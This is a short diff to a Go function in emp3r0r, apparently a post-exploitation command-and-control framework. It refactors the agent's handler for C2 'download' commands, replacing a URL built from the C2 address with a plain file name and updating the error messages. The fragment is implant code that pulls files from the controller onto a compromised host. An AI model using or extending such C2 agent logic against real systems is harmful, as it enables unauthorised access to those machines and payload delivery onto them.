@@ -225,17 +225,17 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			return
 		}
 
-		url := fmt.Sprintf("%swww/%s", emp3r0r_data.CCAddress, cmdSlice[1])
+		file_to_download := cmdSlice[1]
 		path := cmdSlice[2]
 		size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
 		if err != nil {
-			out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
+			out = fmt.Sprintf("processCCData: cant get size of %s: %v", file_to_download, err)
 			sendResponse(out)
 			return
 		}
-		_, err = DownloadViaCC(url, path)
+		_, err = DownloadViaCC(file_to_download, path)
 		if err != nil {
-			out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
+			out = fmt.Sprintf("processCCData: cant download %s: %v", file_to_download, err)
 			sendResponse(out)
 			return
 		}
